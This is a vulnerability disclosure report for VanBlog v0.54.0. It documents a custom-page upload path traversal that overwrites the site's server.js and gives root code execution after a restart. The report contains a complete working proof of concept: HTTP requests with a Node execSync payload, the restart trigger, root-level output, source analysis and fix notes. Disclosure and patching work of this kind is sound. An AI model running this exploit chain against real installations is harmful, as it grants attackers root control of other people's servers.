### Vulnerability details

**Official website / Product:** https://vanblog.mereith.com / https://github.com/Mereithhh/vanblog

**Repository:** Mereithhh/vanblog (stars at selection: 3587)

**Vulnerability type:** file_upload / getshell (customPage upload path traversal → arbitrary file write → overwrite website `server.js` + restart → RCE)

**Vulnerability versions:** mereith/van-blog Docker / git tag **v0.54.0** (Hub `latest`; lab `VAN_BLOG_VERSION=v0.54.0`). Unreleased master later added `normalizeCustomPageRel` for customPage (~#338/#575); the latest **released** artifact remains vulnerable.

**Vulnerability URL / Parameter:** `POST /api/admin/customPage/upload` query params `path` and/or `name` (inject `../`); multipart field `file`

**Complex:** yes

### Verification procedure

1. Bring up the lab with the compose below (original `labs/vanblog-r66-a1` was cleaned post-verify). Image `mereith/van-blog:latest` (verified `VAN_BLOG_VERSION=v0.54.0`, digest `sha256:d5d72b29fe80915dc231ddb177b91e8cd0f1a3e09585a5958a8d8f4d9987c11e`) + `mongo:4.4.16`; containers `vanblog-r66-a1` / `vanblog-r66-a1-mongo`; host port **24601** → container `80`. Compared master HEAD: `81b868f4d568c8accff62b9c35d0e556d1e7970d`.

```bash
mkdir -p /tmp/vanblog-r66-a1-lab
cd /tmp/vanblog-r66-a1-lab
cat > docker-compose.yml <<'EOF'
# Lab recreate for VULN-0086 (original labs/vanblog-r66-a1 cleaned post-verify).
# Host: http://127.0.0.1:24601  |  image mereith/van-blog:latest (VAN_BLOG_VERSION=v0.54.0)
# Image digest at verify: sha256:d5d72b29fe80915dc231ddb177b91e8cd0f1a3e09585a5958a8d8f4d9987c11e
services:
  vanblog:
    image: mereith/van-blog:latest
    container_name: vanblog-r66-a1
    restart: unless-stopped
    environment:
      TZ: Asia/Shanghai
      EMAIL: lab@example.com
    volumes:
      - vanblog_static:/app/static
      - vanblog_log:/var/log
      - vanblog_caddy_config:/root/.config/caddy
      - vanblog_caddy_data:/root/.local/share/caddy
    ports:
      - "24601:80"
    depends_on:
      - mongo

  mongo:
    image: mongo:4.4.16
    container_name: vanblog-r66-a1-mongo
    restart: unless-stopped
    environment:
      TZ: Asia/Shanghai
    volumes:
      - vanblog_mongo:/data/db

volumes:
  vanblog_static:
  vanblog_log:
  vanblog_caddy_config:
  vanblog_caddy_data:
  vanblog_mongo:
EOF
docker compose up -d
# wait until ready; host base URL http://127.0.0.1:24601
```

2. Open `http://127.0.0.1:24601/admin/init` for first-run init; lab account **`admin` / `Admin123!@#`** (UI applies client-side `encryptPwd` before submit).
3. Log in at `http://127.0.0.1:24601/admin`; take JWT from login response `data.token` (or DevTools) into header **`token`** (no `Bearer` prefix). The JWT in the PoC below is lab-captured — replace it with a fresh login token when reproducing.
4. `POST /api/admin/customPage/upload?path=x&name=../../../website/packages/website/server.js` with a malicious `server.js` that `execSync("id")` and writes `/tmp/r66a1-rce2.txt`.
5. Confirm response `data.src` still contains `../` segments (no normalization); optional: `docker exec vanblog-r66-a1 head -5 /app/website/packages/website/server.js` to confirm overwrite.
6. `PUT /api/admin/meta/site` to update site meta: `WebsiteProvider.restart` stops the website child; the exit handler `restore` then `spawn('node', ['./packages/website/server.js'])`, executing the planted script.
7. `docker exec vanblog-r66-a1 cat /tmp/r66a1-rce2.txt` shows `R66A1_GETSHELL` and `uid=0(root)` (see measured output excerpt below).

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/admin/customPage/upload?path=x&name=../../../website/packages/website/server.js HTTP/1.1
Host: 127.0.0.1:24601
User-Agent: Mozilla/5.0 r66-a1-vanblog-poc
Accept: application/json
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3ViIjowLCJ0eXBlIjoiYWRtaW4iLCJwZXJtaXNzaW9ucyI6W10sImlhdCI6MTc5MzY0MDg3OCwiZXhwIjoxNzk0MjQ1Njc4fQ.RDectcfH-anHDczWz51GF5J7dFWvG0Lxqw-8JlKeKh0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr66a1vanblog
Content-Length: 494
Connection: close

------WebKitFormBoundaryr66a1vanblog
Content-Disposition: form-data; name="file"; filename="server.js"
Content-Type: application/javascript

const {execSync}=require("child_process");
const fs=require("fs");
try {
  const out = execSync("id; hostname; pwd", {encoding:"utf8"});
  fs.writeFileSync("/tmp/r66a1-rce2.txt", "R66A1_GETSHELL\n"+out);
} catch(e) {
  fs.writeFileSync("/tmp/r66a1-rce2.txt", "ERR "+String(e));
}
setInterval(()=>{}, 1000);

------WebKitFormBoundaryr66a1vanblog--
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 201 Created
Content-Length: 113
Content-Type: application/json; charset=utf-8
Date: Mon, 02 Nov 2026 17:34:38 GMT
Etag: W/"71-2ysuSB5Hhk57pdHDfJl5Jp6I+0o"
Server: Caddy
X-Powered-By: Express

{"statusCode":200,"data":{"src":"/static/customPage/x/../../../website/packages/website/server.js","isNew":true}}
```

Site-meta update that triggers website restart (`token` same as above — replace with a fresh JWT; any valid `UpdateSiteInfoDto` field works):

```http
PUT /api/admin/meta/site HTTP/1.1
Host: 127.0.0.1:24601
User-Agent: Mozilla/5.0 r66-a1-vanblog-poc
Accept: application/json
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3ViIjowLCJ0eXBlIjoiYWRtaW4iLCJwZXJtaXNzaW9ucyI6W10sImlhdCI6MTc5MzY0MDg3OCwiZXhwIjoxNzk0MjQ1Njc4fQ.RDectcfH-anHDczWz51GF5J7dFWvG0Lxqw-8JlKeKh0
Content-Type: application/json
Connection: close

{"siteName":"vanblog-lab"}
```

Restart-trigger response body:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"statusCode":200,"data":{"acknowledged":true,"modifiedCount":1,"upsertedId":null,"upsertedCount":0,"matchedCount":1}}
```

Verification result notes:

After the upload, `/app/website/packages/website/server.js` inside the container is replaced by the payload. Updating site metadata restarts the website worker, which executes the payload and writes `id` output to `/tmp/r66a1-rce2.txt` (`uid=0(root)`). The same primitive also writes markers under `/tmp` and `/app`. Measured output excerpt:

```text
===RCE===
-rw-r--r--    1 root     root           179 Nov  2 17:34 /tmp/r66a1-rce2.txt
R66A1_GETSHELL
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
750d4e079fd2
/app/website
===AFW===
R66A1_CUSTOMPAGE_TRAVERSAL
-rw-r--r--    1 root     root            30 Nov  2 17:33 /app/r66a1-owned.txt
```

### Vulnerability analysis

The custom-page upload API concatenates attacker-controlled `path`/`name` into the on-disk path without rejecting `..` on v0.54.0:

1. `CustomPageController.upload` assigns query `name` to `file.originalname` and passes query `path` into `StaticProvider.upload(..., 'customPage', ..., path)`.
2. For `customPage`, `StaticProvider.upload` sets `fileName = customPathname + '/' + file.originalname`.
3. `LocalProvider.saveFile` does `path.join(config.staticPath, 'customPage', fileName)` then `fs.writeFileSync`. Node `path.join` resolves `../`, escaping `/app/static/customPage/`.
4. The official image runs as **root**, so the attacker can overwrite `/app/website/packages/website/server.js`. An admin site-meta update restarts the website child, loading the planted script → **RCE/getshell**.

The image-host (`img`) path also concatenates `originalname`, but busboy’s multipart `basename` strips directory segments over HTTP; the counted sink is **customPage upload path traversal** (same `StaticProvider` static-hosting stack).

Trigger / sink source (full path and line numbers):

```javascript
# File: /app/server/controller/admin/customPage/customPage.controller.js (image v0.54.0)
# Lines: 33-40
async upload(file, path, name) {
    this.logger.log(`上传自定义页面文件：${path}\t ${name}`);
    file.originalname = name;
    const res = await this.staticProvider.upload(file, 'customPage', false, path);
    return {
        statusCode: 200,
        data: res,
    };
}
```

```javascript
# File: /app/server/provider/static/static.provider.js (image v0.54.0)
# Lines: 93-96
let fileName = currentSign + '.' + file.originalname;
if (type == 'customPage') {
    fileName = customPathname + '/' + file.originalname;
}
```

```javascript
# File: /app/server/provider/static/local.provider.js (image v0.54.0)
# Lines: 55-62
else if (type == 'customPage') {
    const storagePath = setting_dto_1.StoragePath[type];
    const realName = fileName;
    const srcPath = path.join(config_1.config.staticPath, storagePath, realName);
    const byteLength = buffer.byteLength;
    const realPath = `/static/${storagePath}/${realName}`;
    (0, checkFolder_1.checkOrCreateByFilePath)(srcPath);
    fs.writeFileSync(srcPath, buffer);
```

### Fix notes

Apply master-style `normalizeCustomPageRel` / `resolveCustomPageAbs` to customPage `path`/`name`: reject `..` and ensure the resolved absolute path stays under `static/customPage`. For img uploads, `path.basename(originalname)` plus an extension allowlist. Do not run the container as root.
